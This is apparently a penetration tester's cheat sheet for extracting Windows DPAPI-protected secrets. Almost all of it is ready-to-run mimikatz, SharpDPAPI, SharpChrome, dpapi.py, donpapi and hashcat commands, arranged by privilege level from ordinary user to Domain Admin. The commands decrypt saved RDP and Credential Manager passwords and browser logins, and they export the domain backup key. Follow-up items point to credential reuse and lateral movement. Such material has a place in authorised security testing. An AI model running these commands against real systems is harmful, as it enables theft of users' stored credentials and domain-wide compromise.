# DPAPI

## Before I start
- [ ] Blobs found: `...\Microsoft\Credentials\`, `...\Microsoft\Vault\`, `.rdg` files, browser Login Data — blobs start with `01 00 00 00`
- [ ] Master keys located: `C:\Users\<User>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>` (hidden — `-Force`)
- [ ] Which key does the blob want: `mimikatz dpapi::cred /in:<blob>` reads the guidMasterKey

## I have the user's password or NT hash (no admin needed, offline)
Base64 the blob + master key out if transfer is flaky, then decrypt on Kali.
python3 dpapi.py masterkey -file <GUID> -sid <SID> -password '<Password>'
python3 dpapi.py masterkey -file <GUID> -sid <SID> -key 0x<NTHash>
python3 dpapi.py credential -file <BLOBHEX> -key 0x<MasterKeyHex>
- [ ] Cleartext in the output: saved RDP / Credential Manager / service accounts — try them everywhere: :Pb lateral-movement

## I am the user right now
The DC decrypts my master key for me over RPC.
mimikatz dpapi::masterkey /in:"C:\Users\<User>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>" /rpc
SharpDPAPI.exe triage /unprotect
- [ ] triage = credentials + vaults + rdg + certificates in one shot

## I am local admin but not the user
mimikatz sekurlsa::dpapi
- [ ] Master keys of every logged-on user straight out of LSASS: decrypt their blobs with /masterkey:
SharpDPAPI.exe machinetriage /unprotect
- [ ] Machine-scope blobs too (SYSTEM context)

## I am Domain Admin
Export the domain backup key once, decrypt every domain user's master keys forever.
mimikatz lsadump::backupkeys /system:<DC> /export
SharpDPAPI.exe backupkey /server:<DC.domain> /file:key.pvk
SharpDPAPI.exe triage /server:<Host> /pvk:key.pvk

## I am on Linux with admin on the host
donpapi collect -t <Host> -d <Domain> -u <User> -p '<Password>'

## Browser loot
SharpChrome.exe logins /unprotect
SharpChrome.exe logins /password:<Password>
- [ ] Current Chrome: grab the browser's `Local State` too, the app-bound key lives there

## If the key won't come
DPAPISnoop.exe masterkey-parse C:\Users\<User>\AppData\Roaming\Microsoft\Protect\<SID> --mode hashcat --outfile user.hc
hashcat -m 22102 user.hc /usr/share/wordlists/rockyou.txt
- [ ] Decryption fails with the RIGHT key: app added its own entropy (Outlook, VPN clients) — EntropyCapture + /entropy:

## Next
- [ ] Every recovered cred tested for reuse: :Pb windows-creds
- [ ] `*_adm` and service accounts checked against WinRM/RDP on every reachable host: :Pb lateral-movement
